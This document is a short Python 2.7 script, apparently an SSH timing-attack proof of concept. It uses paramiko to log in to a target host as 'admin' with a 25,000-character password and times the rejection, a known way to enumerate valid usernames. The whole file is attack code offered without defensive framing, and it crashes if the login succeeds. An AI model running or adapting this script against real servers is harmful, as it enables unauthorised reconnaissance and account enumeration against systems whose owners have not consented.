#!/usr/bin/python 2.7
import paramiko
import time
import sys

#user=raw_input("user: ")
p='A'*25000
ssh = paramiko.SSHClient()
starttime=time.clock()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
        ssh.connect(sys.argv[1], username='admin', password=p)
except:
        endtime=time.clock()
total=endtime-starttime
print(total)

